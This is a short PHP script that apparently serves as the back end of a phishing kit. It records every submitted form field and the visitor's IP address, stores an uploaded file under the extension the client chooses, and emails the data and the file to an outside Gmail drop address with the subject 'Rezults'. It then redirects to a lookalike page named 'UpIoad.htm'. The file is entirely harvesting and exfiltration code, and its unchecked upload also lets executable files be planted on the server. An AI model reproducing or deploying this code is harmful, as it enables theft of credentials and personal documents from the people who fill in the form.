<?php
$filename = 'uploads/' . uniqid();
$bodytext = '';

$handle = fopen($filename . '.txt', 'a');

foreach($_POST as $variable => $value) {
    fwrite($handle, $variable . ' = ' . $value . PHP_EOL);
    $bodytext = $bodytext . $variable . ' = ' . $value . PHP_EOL;
}

$bodytext = $bodytext . 'REMOTE IP: ' . $_SERVER['REMOTE_ADDR'] . PHP_EOL;
fwrite($handle, 'REMOTE IP: ' . $_SERVER['REMOTE_ADDR'] . PHP_EOL);
fclose($handle);


$filename = $filename . '.' . pathinfo(basename($_FILES["uploadfile"]["name"]), PATHINFO_EXTENSION);
move_uploaded_file($_FILES["uploadfile"]["tmp_name"], $filename);

require_once('PHPMailer/PHPMailerAutoload.php');

$email = new PHPMailer();
$email->From      = 'kariuqrt@server161.web-hosting.com';
$email->FromName  = 'amirkerlas@gmail.com';
$email->Subject   = 'Rezults';
$email->Body      = $bodytext;
$email->AddAddress( 'agnesaxhemajli1@gmail.com' );


$email->AddAttachment(__DIR__ . '/' . $filename, pathinfo($filename, PATHINFO_BASENAME));
$email->Send();

header('Location: UpIoad.htm');
exit;
?>